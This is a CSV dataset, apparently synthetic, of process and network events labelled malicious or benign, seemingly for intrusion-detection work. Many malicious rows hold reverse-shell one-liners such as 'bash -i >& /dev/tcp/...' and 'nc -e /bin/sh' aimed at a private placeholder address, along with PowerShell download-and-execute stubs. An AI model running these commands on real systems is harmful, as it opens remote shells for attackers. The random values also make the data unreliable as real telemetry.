timestamp,process_id,parent_process,child_process,source_ip,destination_ip,destination_port,protocol,bytes_sent,bytes_received,duration,command_executed,is_malicious
2025-03-18 16:17:45.864452,05da7825,systemd,notepad.exe,21.198.29.140,129.223.150.236,4444,TCP,4390,4774,52.76,"python -c 'import socket,subprocess'",1
2025-04-27 09:36:45.779577,6ce39d74,explorer.exe,notepad.exe,201.227.33.107,200.223.117.112,3389,UDP,3087,1463,0.38,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-24 20:44:45.645782,af740d3d,systemd,explorer.exe,80.89.101.63,150.124.69.134,8080,TCP,1491,2022,41.29,ping,0
2025-04-23 00:44:45.375826,c272dae7,systemd,chrome.exe,148.43.191.144,147.187.217.194,443,UDP,469,4054,3.86,dir,0
2025-02-24 13:13:46.223515,b5818ce1,init,svchost.exe,30.60.170.141,79.107.237.164,4444,UDP,3543,1557,52.69,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-02 16:01:45.257210,35bbab68,init,nc,181.82.197.108,26.105.44.106,4444,UDP,3995,634,9.37,ls,0
2025-02-23 12:30:46.226977,fc450df4,init,nc,229.84.113.27,217.141.216.51,1337,TCP,4290,4877,30.01,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-04 09:44:45.313419,9d3dece8,systemd,chrome.exe,57.197.184.202,126.236.26.241,3389,UDP,3570,3556,9.76,cd,0
2025-03-21 13:25:45.318829,42cc545e,systemd,chrome.exe,143.143.32.20,104.229.65.150,443,UDP,287,1463,15.58,dir,0
2025-03-24 14:26:45.442099,9e9127f3,svchost.exe,nc,27.254.1.142,132.14.236.11,8080,TCP,1438,1422,8.65,ls,0
2025-02-21 14:27:46.319194,98078710,init,explorer.exe,28.146.188.133,154.212.72.158,443,TCP,1790,2342,9.62,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-21 06:45:44.993035,3b901a43,init,bash,177.169.132.108,115.177.68.227,4444,UDP,4344,3628,50.04,cd,0
2025-04-14 11:23:46.070003,64adfdc4,systemd,cmd.exe,106.205.211.78,214.172.238.65,4444,TCP,1847,157,13.75,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-04 22:04:45.950397,129e91a0,explorer.exe,chrome.exe,240.222.66.10,211.131.207.66,1337,UDP,2131,3656,5.01,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-22 14:32:44.970978,a8931a5e,init,python.exe,168.106.104.50,7.177.51.98,443,TCP,4248,3425,42.93,ipconfig,0
2025-03-23 01:46:46.261201,afbd02ba,systemd,bash,219.123.129.138,190.191.23.69,3389,UDP,4858,240,45.68,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-07 00:30:44.889201,1be618cc,svchost.exe,svchost.exe,200.238.9.170,52.198.176.65,22,UDP,3901,1734,54.52,cd,0
2025-05-01 00:55:44.756343,64c01804,svchost.exe,notepad.exe,86.21.226.147,207.7.254.189,443,UDP,659,2097,11.89,ping,0
2025-03-27 00:34:44.945255,7db5cf25,init,nc,78.165.113.151,4.72.207.92,4444,TCP,1219,2460,43.47,ls,0
2025-03-29 01:15:44.719850,b6fbe491,init,cmd.exe,147.58.207.110,217.144.250.197,3389,TCP,2240,287,10.91,ping,0
2025-03-12 06:12:44.775220,1a2f0af5,systemd,chrome.exe,118.95.186.224,62.45.121.240,1337,TCP,2693,1136,17.65,dir,0
2025-03-09 11:37:44.890613,58560991,svchost.exe,chrome.exe,239.240.82.144,102.153.39.224,8080,TCP,2619,3579,1.59,cd,0
2025-04-10 10:32:45.388468,914899d9,svchost.exe,notepad.exe,146.246.187.148,97.97.8.253,4444,TCP,2048,2531,10.94,ping,0
2025-03-04 05:02:45.972507,ad296b46,init,chrome.exe,1.133.71.246,234.151.180.125,443,UDP,4290,3092,32.65,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-21 08:50:46.399781,8deefa46,svchost.exe,cmd.exe,167.43.145.245,105.139.104.62,4444,UDP,200,1475,36.54,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-24 17:54:45.031334,8fddc12d,init,explorer.exe,156.154.249.155,28.45.160.221,3389,TCP,2289,4332,55.61,cd,0
2025-04-23 15:39:45.480985,71176539,explorer.exe,cmd.exe,116.220.95.73,215.16.216.136,3389,UDP,1502,976,55.83,cd,0
2025-03-14 19:52:46.222666,b0962c0a,systemd,svchost.exe,67.6.138.165,123.47.153.56,4444,UDP,4563,259,13.45,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-26 20:41:46.195080,f93b6971,svchost.exe,svchost.exe,5.63.96.193,175.94.209.16,443,UDP,3400,2564,24.22,"python -c 'import socket,subprocess'",1
2025-03-01 17:29:46.006630,b4bec5fe,init,chrome.exe,102.8.17.229,70.151.181.83,8080,TCP,3552,2600,31.11,"python -c 'import socket,subprocess'",1
2025-04-11 02:09:45.304606,78043034,systemd,powershell,35.239.233.65,50.75.61.87,3389,TCP,3540,2726,11.0,ipconfig,0
2025-03-14 06:02:46.110328,7d1579f4,init,bash,81.158.59.185,110.189.14.230,22,TCP,239,4095,5.51,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-31 08:56:45.693470,1ca70af2,systemd,python.exe,1.8.249.208,247.71.99.184,1337,UDP,2731,4066,56.57,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-25 03:58:45.329296,a582f60c,init,svchost.exe,62.192.169.136,64.164.94.39,4444,TCP,273,4215,25.25,ls,0
2025-03-27 13:35:44.997891,114bafdb,systemd,explorer.exe,234.219.220.172,240.27.206.203,4444,TCP,4567,4790,8.0,ipconfig,0
2025-03-16 18:11:45.390324,fdb4cf63,systemd,notepad.exe,158.249.79.126,72.47.108.127,8080,TCP,3756,3536,57.99,ipconfig,0
2025-02-25 18:46:45.318532,4bd7867f,svchost.exe,python.exe,222.26.143.112,227.179.56.130,22,UDP,1910,177,7.38,ipconfig,0
2025-03-15 23:44:45.520510,2f57735f,systemd,cmd.exe,44.69.103.160,26.62.83.62,4444,TCP,3317,4499,51.71,dir,0
2025-03-28 09:53:45.902129,1a1e72f3,explorer.exe,python.exe,71.110.208.26,115.165.98.60,443,TCP,2996,2687,55.09,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-03 20:10:45.862305,9f54ad8d,systemd,python.exe,13.131.79.59,86.136.98.9,8080,TCP,229,1455,55.47,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-26 20:04:46.128073,d6e7ff55,svchost.exe,cmd.exe,77.48.247.92,194.169.73.26,4444,UDP,2306,3273,18.72,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-19 04:44:45.621627,6948070e,svchost.exe,notepad.exe,174.171.186.87,33.72.9.101,22,UDP,3238,1365,13.29,cd,0
2025-04-27 03:40:45.808907,ce864a23,init,notepad.exe,96.35.197.232,77.208.66.103,22,TCP,4035,1477,14.12,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-04 15:34:45.896063,b15b0be7,svchost.exe,nc,245.173.50.239,227.178.4.188,3389,TCP,2631,975,49.68,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-01 07:26:45.342516,1b6bc847,init,nc,250.50.19.175,203.64.108.93,1337,TCP,2235,2749,3.12,dir,0
2025-03-18 16:00:44.746078,3a34fc21,systemd,svchost.exe,114.79.94.106,67.40.78.3,22,TCP,2867,2399,28.2,dir,0
2025-03-20 06:32:45.813814,cb698eb0,systemd,perl,29.8.38.103,206.215.181.161,4444,TCP,4011,4619,15.57,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-17 03:57:46.266195,93c30eae,systemd,chrome.exe,101.123.167.130,203.13.249.174,4444,UDP,2219,56,43.82,"python -c 'import socket,subprocess'",1
2025-04-04 16:50:45.925079,be02aee6,systemd,chrome.exe,177.2.84.237,186.250.90.154,8080,UDP,2309,4817,16.33,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-14 09:04:46.010417,167d3cd0,svchost.exe,cmd.exe,37.113.39.37,202.63.210.226,443,UDP,94,3148,0.7,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-24 15:02:45.134637,68e8ee5b,init,powershell,46.138.114.240,47.198.52.138,3389,UDP,3346,2753,24.28,ping,0
2025-03-28 10:10:44.730105,7cf3499f,svchost.exe,nc,223.235.233.97,97.21.175.247,1337,TCP,2898,1021,10.79,ipconfig,0
2025-02-23 16:56:44.828652,0256e819,explorer.exe,notepad.exe,114.4.201.190,31.158.76.242,4444,TCP,905,707,40.24,cd,0
2025-04-18 02:19:45.578725,4ea55d71,svchost.exe,python.exe,102.81.253.252,220.234.167.149,3389,TCP,2078,4284,36.44,ping,0
2025-03-06 14:26:45.210911,e297fb30,systemd,python.exe,172.65.95.190,47.180.92.35,4444,TCP,3177,675,23.28,cd,0
2025-03-08 22:42:45.551637,ede9dba3,init,chrome.exe,77.100.84.30,162.233.132.240,4444,TCP,399,4834,5.75,cd,0
2025-04-05 06:52:45.995604,be44154a,systemd,nc,95.64.38.129,110.98.191.18,443,TCP,2764,559,21.59,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-12 14:56:45.828890,b81b2081,systemd,svchost.exe,122.36.157.219,1.244.4.133,3389,UDP,3919,2803,46.99,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-27 12:50:45.487463,d5fe8a04,init,explorer.exe,25.248.124.31,206.254.123.82,4444,UDP,4686,1677,33.87,dir,0
2025-04-05 00:58:45.863404,50d6af23,systemd,notepad.exe,226.140.158.183,172.220.79.250,4444,UDP,2778,1911,37.67,nc -e /bin/sh 192.168.1.100 4444,1
2025-02-22 04:31:45.649729,5ad6cbb0,init,chrome.exe,118.135.121.127,193.46.52.39,8080,UDP,2475,1108,41.7,ipconfig,0
2025-03-20 14:02:44.779584,06f7d9a6,svchost.exe,nc,244.100.119.94,87.84.171.103,443,TCP,2065,1827,42.78,ipconfig,0
2025-04-12 07:40:45.211173,bf47472a,svchost.exe,notepad.exe,186.190.60.198,99.23.151.20,443,UDP,1955,1018,25.88,ipconfig,0
2025-04-02 03:33:45.591929,7c057b96,init,bash,77.150.144.229,102.227.151.167,22,TCP,2392,4895,28.46,cd,0
2025-04-26 22:04:44.934376,45c14fe7,explorer.exe,perl,21.235.246.234,90.190.118.232,3389,TCP,3106,2831,20.24,ipconfig,0
2025-03-15 14:15:46.191484,024f3f67,init,svchost.exe,140.13.165.231,74.113.86.81,22,UDP,3446,2990,33.38,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-24 03:41:45.902349,457726ac,explorer.exe,perl,208.157.138.178,36.243.29.97,443,TCP,4544,620,29.54,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-23 15:49:45.762640,9f8cfe69,init,bash,129.15.12.72,155.168.54.81,3389,TCP,524,1565,14.44,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-14 23:20:45.714026,3af078c1,init,explorer.exe,206.192.205.86,199.29.59.143,1337,UDP,2493,2377,4.6,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-16 12:14:44.964263,b7b4f4d9,explorer.exe,chrome.exe,108.167.251.144,155.131.249.141,1337,TCP,4037,3665,21.6,ping,0
2025-04-02 04:03:46.043230,3f984e03,systemd,explorer.exe,244.207.219.199,44.115.211.48,443,TCP,692,4748,4.91,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-08 00:14:46.142787,2af0a975,systemd,svchost.exe,185.159.134.38,131.231.68.1,22,TCP,2329,2969,24.68,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-05 16:58:45.026043,9d796487,systemd,perl,22.166.16.56,212.114.69.150,8080,TCP,3525,2502,21.85,cd,0
2025-04-04 13:47:45.431109,27894210,explorer.exe,svchost.exe,109.176.21.227,76.207.203.75,22,TCP,665,2844,12.72,dir,0
2025-03-30 00:54:45.468416,d8080f27,init,nc,182.140.238.205,104.160.13.30,1337,UDP,2087,3069,31.93,ping,0
2025-02-21 18:35:46.098985,02f0cb12,systemd,notepad.exe,136.21.114.143,114.220.103.208,3389,TCP,1832,4535,28.47,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-05 01:51:46.002378,b6c1ccbe,systemd,svchost.exe,87.100.177.236,34.132.162.2,22,TCP,2430,3224,6.86,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-26 13:21:45.683762,87d44025,init,nc,114.137.88.44,15.9.191.41,443,TCP,1564,1879,52.6,nc -e /bin/sh 192.168.1.100 4444,1
2025-02-26 06:33:45.834764,d86a53e6,svchost.exe,chrome.exe,194.138.219.113,80.2.111.47,1337,UDP,4443,1099,18.29,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-29 17:20:46.257335,0899faf5,svchost.exe,explorer.exe,140.120.17.39,88.223.232.227,1337,UDP,400,4768,11.46,"python -c 'import socket,subprocess'",1
2025-03-26 00:39:44.835184,3cce3479,init,chrome.exe,190.103.196.213,98.237.199.113,3389,TCP,256,3099,21.87,ls,0
2025-04-03 21:27:45.465105,a9308378,explorer.exe,chrome.exe,58.21.19.199,60.189.238.35,1337,UDP,150,4930,55.24,ping,0
2025-04-28 01:44:46.199203,595abe23,explorer.exe,explorer.exe,231.204.191.19,186.202.20.14,1337,TCP,295,1292,36.36,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-21 08:24:45.178717,3a0ac4c5,svchost.exe,powershell,217.33.17.59,59.141.91.25,8080,UDP,1671,959,30.84,ipconfig,0
2025-04-14 07:38:44.883200,150c0679,svchost.exe,chrome.exe,134.46.167.98,231.90.155.229,443,TCP,4208,386,17.28,ipconfig,0
2025-02-26 06:24:45.600787,0725d028,svchost.exe,nc,65.16.218.205,165.148.125.80,443,TCP,950,1239,52.69,ping,0
2025-03-13 00:43:45.987344,a4c6506b,explorer.exe,svchost.exe,207.64.149.45,204.82.59.199,1337,UDP,109,1071,31.07,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-13 03:27:44.885327,fee4b24b,svchost.exe,python.exe,161.88.5.199,189.245.226.235,22,TCP,3060,4918,20.87,cd,0
2025-04-18 14:21:45.151809,7088fae2,systemd,powershell,174.161.210.173,101.117.57.242,3389,UDP,4960,3208,1.72,ipconfig,0
2025-03-19 12:51:45.491018,43586f2c,explorer.exe,cmd.exe,18.213.102.55,158.12.149.36,4444,TCP,211,1309,18.2,dir,0
2025-02-22 21:25:45.794740,1c07c79c,svchost.exe,explorer.exe,27.240.12.109,48.159.248.8,3389,UDP,4992,2608,39.54,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-25 19:55:46.118971,98d5bc33,init,explorer.exe,149.187.236.46,132.166.123.65,3389,TCP,4399,989,36.53,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-22 13:02:45.436073,ae99fa85,init,notepad.exe,60.195.43.141,234.138.84.169,3389,TCP,2417,3236,18.53,ls,0
2025-03-05 19:20:46.203973,bd7acee1,systemd,bash,16.182.187.45,233.252.127.100,443,TCP,2541,2494,17.58,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-30 08:31:46.306712,3b108ad8,systemd,bash,130.66.209.148,112.241.123.211,3389,UDP,2863,4935,8.59,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-10 18:02:46.286664,c9f9cdd9,init,perl,113.180.239.27,209.141.254.109,22,TCP,4832,2550,35.47,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-21 13:19:44.991672,60ef2078,svchost.exe,nc,33.86.46.115,152.50.193.187,1337,UDP,2134,2270,21.12,dir,0
2025-03-10 07:51:46.003877,f0a4b9ea,explorer.exe,bash,95.168.118.139,248.228.23.48,22,TCP,2851,1758,32.88,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-09 09:58:45.905067,caa08539,init,nc,76.67.65.58,172.96.44.252,1337,UDP,4331,523,38.12,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-01 04:28:44.910948,12b705af,explorer.exe,explorer.exe,217.82.250.50,73.128.228.126,1337,UDP,701,719,59.76,dir,0
2025-03-31 17:08:45.209734,32676e1c,explorer.exe,powershell,6.2.218.233,252.227.38.157,22,UDP,3591,4121,9.97,dir,0
2025-03-11 16:44:45.926431,34f989a1,systemd,nc,144.28.137.87,46.234.215.237,443,UDP,4085,405,48.05,"python -c 'import socket,subprocess'",1
2025-04-24 20:17:46.330628,9a9e4e99,systemd,explorer.exe,63.42.98.249,223.48.93.200,8080,TCP,4519,3767,12.61,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-08 10:42:44.730637,2f306745,init,nc,154.173.181.224,13.63.190.12,8080,UDP,1969,4471,13.11,dir,0
2025-02-24 22:39:45.156081,f44ef38f,svchost.exe,bash,149.76.28.109,246.48.10.64,22,UDP,4807,1064,19.82,cd,0
2025-04-21 03:35:45.405372,b254f16d,explorer.exe,notepad.exe,105.89.8.59,94.244.53.201,22,TCP,566,1731,59.23,dir,0
2025-03-05 07:39:45.824728,15841432,init,svchost.exe,89.16.239.211,41.107.231.70,443,UDP,3495,3267,35.31,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-19 06:11:45.677468,a0ccfc8b,svchost.exe,svchost.exe,100.116.217.25,243.101.212.178,1337,UDP,3970,2009,8.84,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-21 09:18:45.258484,00188033,systemd,powershell,45.227.1.38,181.217.103.217,4444,TCP,3873,3434,51.13,ping,0
2025-03-19 15:32:45.811938,ce82d274,explorer.exe,powershell,18.177.200.34,64.194.119.126,443,UDP,1705,3411,17.31,"python -c 'import socket,subprocess'",1
2025-03-19 19:20:45.599206,3038b388,explorer.exe,powershell,21.225.132.172,245.175.178.207,443,UDP,4644,1635,39.27,cd,0
2025-04-30 07:04:44.861866,80cac151,explorer.exe,cmd.exe,192.204.207.105,215.11.225.139,1337,TCP,4142,887,15.47,ipconfig,0
2025-04-16 14:24:44.748230,59ea54d0,systemd,notepad.exe,9.105.196.249,4.237.70.244,8080,TCP,1711,1725,4.06,cd,0
2025-03-09 18:43:45.603466,320f72ae,init,chrome.exe,168.79.120.231,168.58.234.100,22,TCP,4482,4673,20.23,dir,0
2025-03-24 14:15:44.722552,4c890f4e,explorer.exe,explorer.exe,153.122.68.248,168.201.249.199,3389,TCP,470,4830,28.88,ipconfig,0
2025-04-01 18:10:45.888837,ae0918ad,systemd,notepad.exe,99.185.127.50,170.171.98.185,22,TCP,3485,1429,43.49,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-05 16:38:44.752429,7a02885d,svchost.exe,perl,189.80.176.250,216.114.58.142,8080,UDP,3555,1596,51.42,cd,0
2025-03-06 23:00:46.136531,5770bc22,explorer.exe,bash,226.61.21.139,241.210.197.79,3389,TCP,341,2337,38.27,"python -c 'import socket,subprocess'",1
2025-04-03 09:03:45.617691,67123f20,init,powershell,69.112.203.116,158.55.73.87,1337,TCP,4750,1171,27.06,ping,0
2025-03-22 19:13:45.339901,9c054c15,systemd,svchost.exe,43.144.95.7,218.101.191.227,443,UDP,1714,4421,53.21,ls,0
2025-04-14 00:40:45.507409,16dc0503,init,chrome.exe,52.87.68.18,100.194.182.244,3389,UDP,1560,303,24.97,ls,0
2025-04-25 01:17:45.479098,c9840279,explorer.exe,svchost.exe,136.1.85.77,135.125.27.55,443,UDP,193,3902,22.13,ls,0
2025-03-21 17:02:46.342563,eb124c91,svchost.exe,bash,7.221.242.225,74.111.182.52,4444,UDP,4419,686,7.65,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-01 04:14:45.413260,ae544305,svchost.exe,svchost.exe,106.61.114.4,62.157.43.234,8080,UDP,3252,2919,24.73,ls,0
2025-04-07 20:11:45.719204,df503b8e,init,svchost.exe,77.201.226.66,128.210.225.142,22,UDP,1684,1423,12.93,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-11 00:08:44.906416,58276ea5,init,notepad.exe,123.15.178.12,186.179.184.17,1337,UDP,2304,4696,11.51,cd,0
2025-04-01 08:25:46.363020,50c82fa8,init,cmd.exe,203.14.248.204,52.148.81.197,4444,UDP,1569,4718,31.69,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-06 03:59:45.848074,af58903a,init,chrome.exe,10.178.29.22,179.87.236.5,4444,TCP,1353,369,12.74,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-12 18:36:45.875836,f76b7d4a,svchost.exe,python.exe,154.48.1.178,215.206.191.197,3389,TCP,2058,4515,2.35,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-20 04:49:45.316787,044456c7,init,powershell,184.129.119.8,247.92.195.107,22,UDP,442,3861,35.18,cd,0
2025-03-12 02:11:46.221540,bcf1dd12,init,cmd.exe,43.40.166.107,64.105.199.15,1337,TCP,1991,1208,59.9,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-13 02:14:46.222487,251905b4,svchost.exe,svchost.exe,5.127.38.221,30.178.228.227,443,TCP,4643,2173,31.45,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-20 19:05:45.191540,00a42124,svchost.exe,bash,2.122.46.138,234.146.169.138,1337,UDP,2715,4257,49.25,dir,0
2025-03-12 22:59:44.789702,a8bdd63f,init,perl,250.51.62.152,24.162.174.51,8080,TCP,1153,3367,38.68,ls,0
2025-04-29 20:05:45.961987,205df1ce,init,svchost.exe,113.13.144.136,98.227.139.149,8080,UDP,3836,3422,47.34,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-19 00:41:46.207933,f69695c5,explorer.exe,svchost.exe,96.17.62.85,30.209.166.1,4444,UDP,2937,4717,54.16,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-24 12:04:45.363941,6b2ce962,init,powershell,164.199.189.112,97.200.30.210,443,TCP,1122,461,34.08,cd,0
2025-03-06 19:33:44.982068,75658e99,systemd,cmd.exe,103.144.102.42,14.183.123.88,443,TCP,4960,764,45.67,ipconfig,0
2025-05-01 05:05:46.355436,b0b11665,svchost.exe,explorer.exe,12.13.210.17,200.73.102.117,443,TCP,1847,3794,53.86,"python -c 'import socket,subprocess'",1
2025-04-21 15:31:45.650063,af1c74f4,svchost.exe,notepad.exe,197.239.27.59,219.39.212.85,1337,UDP,1421,4616,29.7,cd,0
2025-03-21 14:18:45.498933,31fcfc30,svchost.exe,svchost.exe,173.251.131.232,137.167.24.142,3389,UDP,3888,938,29.39,ls,0
2025-04-02 02:27:46.062031,094d6955,explorer.exe,explorer.exe,24.156.5.229,209.96.235.68,3389,UDP,764,4630,41.08,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-20 06:18:45.712849,152ef47a,init,cmd.exe,24.26.109.117,251.222.180.80,8080,UDP,1297,477,13.58,"python -c 'import socket,subprocess'",1
2025-03-29 12:30:45.321829,0c440fd5,svchost.exe,chrome.exe,181.168.209.252,185.244.135.188,22,TCP,3713,3238,8.56,ping,0
2025-04-01 10:54:45.830062,0db7e5ec,systemd,cmd.exe,115.51.249.127,214.111.64.245,22,TCP,3644,1444,8.12,"python -c 'import socket,subprocess'",1
2025-03-04 17:20:45.205972,c8b7c6a3,svchost.exe,bash,185.157.91.12,5.226.144.120,443,TCP,1732,4688,54.07,dir,0
2025-02-28 11:41:45.797846,1a489960,svchost.exe,perl,11.167.85.107,249.129.159.187,4444,UDP,3573,764,9.17,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-29 20:12:45.382219,9cb07914,explorer.exe,notepad.exe,214.111.28.119,49.59.134.207,443,TCP,2402,4700,39.58,ping,0
2025-03-10 23:19:44.965813,91a1ab62,svchost.exe,chrome.exe,253.69.69.195,77.100.233.246,443,TCP,1215,4391,41.09,ls,0
2025-03-30 16:22:46.097708,6fd44e2c,systemd,perl,239.171.61.65,135.241.213.93,1337,TCP,4845,3253,49.99,"python -c 'import socket,subprocess'",1
2025-04-11 17:05:46.043317,b222b59c,systemd,powershell,227.244.20.62,77.74.140.246,3389,TCP,4446,4136,56.74,"python -c 'import socket,subprocess'",1
2025-04-13 10:40:46.136720,8c955144,systemd,perl,193.130.235.160,43.120.92.43,443,TCP,3773,139,0.36,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-16 08:20:45.856780,5e4051bb,explorer.exe,python.exe,144.248.118.248,12.14.73.118,4444,TCP,3928,4928,44.45,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-05-01 00:10:45.873460,677e27c2,svchost.exe,svchost.exe,220.240.232.55,38.54.72.204,8080,TCP,3147,82,23.06,"python -c 'import socket,subprocess'",1
2025-04-08 21:14:45.417801,526a7205,systemd,powershell,205.18.115.3,155.206.69.40,1337,TCP,3304,4963,15.53,ping,0
2025-03-15 13:30:45.839400,884fb684,explorer.exe,python.exe,221.140.207.28,137.28.224.16,443,UDP,2484,3259,40.79,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-28 14:45:45.567034,2c03c24f,svchost.exe,bash,249.58.70.233,169.211.249.157,8080,UDP,4017,137,43.5,ls,0
2025-04-25 09:38:45.229175,2ef6290b,init,chrome.exe,36.198.144.66,237.221.143.113,3389,TCP,247,3995,16.64,ipconfig,0
2025-03-15 06:01:45.794021,2279ba9c,systemd,explorer.exe,244.25.89.231,181.246.85.55,3389,TCP,528,4694,47.22,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-04 12:43:45.229561,2373e58b,explorer.exe,powershell,243.25.205.116,162.187.159.116,3389,TCP,1098,4863,16.47,dir,0
2025-04-01 07:04:45.433574,9b99e432,svchost.exe,nc,55.200.45.114,184.99.226.76,443,UDP,3493,3300,54.4,ping,0
2025-02-25 01:34:45.556753,5a2d5683,svchost.exe,cmd.exe,32.67.215.148,99.87.250.56,4444,UDP,2248,3818,39.73,ls,0
2025-03-24 21:57:45.805183,8672642b,init,perl,83.251.94.36,100.178.131.19,443,TCP,1483,3891,38.82,"python -c 'import socket,subprocess'",1
2025-04-20 14:16:45.625231,03767437,systemd,nc,116.230.63.153,90.226.158.118,1337,TCP,4573,1374,38.02,dir,0
2025-04-30 10:38:45.280768,38fcb685,svchost.exe,cmd.exe,24.135.108.247,61.103.116.207,443,UDP,3656,4749,12.02,ping,0
2025-03-12 01:19:46.078900,bb1d2f18,explorer.exe,bash,249.125.24.63,233.134.15.58,4444,UDP,100,1747,35.91,"python -c 'import socket,subprocess'",1
2025-02-28 02:16:45.652070,b9c4fd1d,svchost.exe,svchost.exe,76.199.98.230,189.10.40.251,3389,TCP,3630,896,28.06,ping,0
2025-04-20 06:12:45.869547,48f1ed91,explorer.exe,svchost.exe,10.62.74.96,90.183.63.131,443,UDP,3961,1375,17.85,"python -c 'import socket,subprocess'",1
2025-03-08 18:04:46.070994,7268e839,svchost.exe,cmd.exe,157.99.138.248,226.164.8.173,3389,TCP,4177,4935,15.65,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-18 10:16:45.852529,ab6d9a45,systemd,cmd.exe,81.111.244.236,177.27.183.145,4444,TCP,2318,3126,27.54,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-23 14:18:46.097661,20ba3bd6,init,python.exe,221.169.115.81,225.211.189.63,22,TCP,3700,1564,14.93,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-21 11:48:45.487045,0e7cbbff,init,bash,240.220.115.70,235.108.45.29,22,TCP,2057,3564,47.24,ping,0
2025-03-28 06:42:46.325581,a57c9b41,svchost.exe,notepad.exe,102.245.114.89,239.88.167.80,22,TCP,857,2089,28.53,"python -c 'import socket,subprocess'",1
